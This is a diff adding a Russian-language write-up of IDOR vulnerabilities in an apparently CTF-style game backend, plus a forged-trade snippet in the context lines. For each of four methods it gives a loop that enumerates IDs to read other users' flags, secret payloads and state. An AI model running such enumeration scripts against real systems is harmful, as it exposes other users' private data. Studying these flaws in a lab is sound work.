@@ -101,3 +101,66 @@ console.log(`Создан фальшивый трейд ${tradeId} от Алис
 // Можно указать любого пользователя, даже несуществующего (при нарушении внешнего ключа? FOREIGN KEY проверит, но пользователь должен существовать)
 const fakeUserId = 999999; // если такого нет, то FOREIGN KEY выбросит ошибку. Но можно использовать существующего.
 db.createTrade(fakeUserId, malloryId, aliceCardId); // ошибка foreign key, если fakeUserId нет
+
+# (pi)Idorы 
+1. Уязвимость в getPuzzleBoard
+Проблема: метод getPuzzleBoard(boardId) возвращает полную информацию о доске (включая stego_payload и tiles_seed) без проверки, принадлежит ли доска текущему пользователю. Любой, кто знает или подберёт boardId, может прочитать скрытое сообщение (stegoPayload), которое часто является флагом или секретной наградой.
+
+Пример эксплуатации (скрипт):
+
+javascript
+const db = new Db('./game.db');
+
+// Подбираем ID досок, начиная с 1
+for (let boardId = 1; boardId <= 1000; boardId++) {
+  const board = db.getPuzzleBoard(boardId);
+  if (board && board.stegoPayload) {
+    console.log(`[!] Украден stegoPayload доски ${boardId} (владелец user ${board.userId}): ${board.stegoPayload}`);
+  }
+}
+Результат: злоумышленник узнаёт все секретные сообщения всех пазлов.
+
+2. Уязвимость в getCard
+Проблема: метод getCard(cardId) возвращает данные любой карты (customName, power, metadataJson) по её id, без проверки владельца. Это позволяет узнать состав колоды, силу карт и метаданные других игроков.
+
+Пример эксплуатации (скрипт):
+
+javascript
+// Получаем информацию о всех картах в системе
+for (let cardId = 1; cardId <= 5000; cardId++) {
+  const card = db.getCard(cardId);
+  if (card) {
+    console.log(`Card ${cardId}: owner=${card.userId}, name=${card.customName}, power=${card.power}, meta=${card.metadataJson}`);
+  }
+}
+Результат: злоумышленник видит все карты всех игроков, может подбирать уязвимые цели для трейдов.
+
+3. Уязвимость в getPet
+Проблема: метод getPet(petId) отдаёт полную информацию о питомце другого пользователя, включая state_json (состояние, прогресс, секретные параметры). Это позволяет следить за чужими питомцами.
+
+Пример эксплуатации:
+for (let petId = 1; petId <= 2000; petId++) {
+  const pet = db.getPet(petId);
+  if (pet) {
+    console.log(`Pet ${petId}: owner=${pet.userId}, name=${pet.name}, state=${pet.stateJson}`);
+  }
+}
+Результат: злоумышленник получает полную информацию о прогрессе и состоянии чужих питомцев.
+
+4. Уязвимость в getAlchemyArtifact
+Проблема: метод getAlchemyArtifact(runId) возвращает данные любого алхимического эксперимента, включая artifact_note (может содержать флаг) и состояние state без проверки владельца. Даже финализированные артефакты становятся публичными.
+
+Пример эксплуатации:
+for (let runId = 1; runId <= 1000; runId++) {
+  const art = db.getAlchemyArtifact(runId);
+  if (art) {
+    console.log(`Alchemy ${runId}: user=${art.userId}, state=${art.state}, note=${art.artifactNote}`);
+  }
+}
+Результат: злоумышленник читает чужие артефакты и заметки.
+
+Почему это опасно (общее для всех)
+Нарушение конфиденциальности: любой может прочитать любые данные системы.
+В stego_payload, artifact_note, metadata_json и state_json часто хранятся флаги, ключи, приватные сообщения или награды.
+Атакующий не нуждается в авторизации — достаточно иметь доступ к экземпляру Db (например, через инъекцию или если эти методы торчат наружу в API).
+
